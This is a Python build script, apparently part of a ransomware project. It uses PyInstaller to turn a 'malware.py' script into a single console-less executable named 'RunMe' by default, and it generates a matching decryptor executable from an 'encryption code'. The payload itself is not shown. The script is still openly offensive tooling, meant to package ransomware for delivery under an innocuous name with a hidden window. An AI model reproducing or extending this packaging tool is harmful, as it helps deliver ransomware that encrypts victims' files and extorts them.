import argparse
import os
import shutil
import sys
import subprocess
import PyInstaller.__main__ #type:ignore

def build_exec(script_path, output_name="RunMe"):
    PyInstaller.__main__.run([
        script_path,
        '--onefile',
        '--noconsole',
        f'--name={output_name}',
    ])

def clean_up(name):
    spec_file = name + ".spec"
    
    # Remove the 'build' directory
    if os.path.exists('build'):
        shutil.rmtree('build')
        print("Cleaned up build artifacts")

    # Remove the '.spec' file
    if os.path.exists(spec_file):
        os.remove(spec_file)
        print(f"Cleaned up build spec file: {spec_file}")

def main():
    parser = argparse.ArgumentParser(description="Executable generator for malware or decryptor.")
    
    # Subcommands for encryptor and decryptor generation
    parser.add_argument(
        '--m', '-malware', 
        metavar='malware_script_path',
        help="Path to the malware Python script (malware.py) to generate an executable."
    )
    
    parser.add_argument(
        '--d', '-decrypt', 
        nargs=2,
        metavar=('decryptor_script_path', 'encryption_code'),
        help="Path to the decryptor generator script and encryption code for generating the decryptor executable."
    )
    # Optional argument for custom output name
    parser.add_argument(
        '--n', '-name',
        metavar='output_name',
        default="RunMe",
        help="Optional name for the output executable. Defaults to 'RunMe'."
    )

    args = parser.parse_args()
    
    # Determine output name for the executable
    output_name = args.n

    if args.m:
        # Generate malware executable
        script_path = args.m
        if not os.path.isfile(script_path):
            print(f"Error: Malware script '{script_path}' not found.")
            return
        print(f"Generating malware executable from '{script_path}'...")
        build_exec(script_path, output_name=output_name)
        print(f"Malware executable '{output_name}' generated successfully. '{output_name}' in 'dist' directory.")
        clean_up(output_name)

    elif args.d:
        # Generate decryptor executable
        decryptor_script_path, encryption_code = args.d
        if not os.path.isfile(decryptor_script_path):
            print(f"Error: Decryptor generator script '{decryptor_script_path}' not found.")
            return
        print(f"Generating decryptor with encryption code '{encryption_code}'...")

        decryptor_output_path = "decryptyourstuffbro.py"
        subprocess.run([sys.executable, decryptor_script_path, encryption_code])
        
        # Verify that the decryptor script was generated
        if not os.path.exists(decryptor_output_path):
            print(f"Error: Expected decryptor script '{decryptor_output_path}' was not created.")
            return
        
        # Build the decryptor executable
        print("Building decryptor executable...")
        build_exec(decryptor_output_path, output_name=output_name)
        print(f"Decryptor executable '{output_name}' generated successfully. '{output_name}' in 'dist' directory.")
        
        # Clean up the intermediate Python file if desired
        if os.path.exists(decryptor_output_path):
            os.remove(decryptor_output_path)
            print(f"Intermediate file '{decryptor_output_path}' removed.")
        clean_up(output_name)

    else:
        print("Please specify either --m (malware) or --d (decrypt) with the required parameters.")
        parser.print_help()

if __name__ == '__main__':
    main()
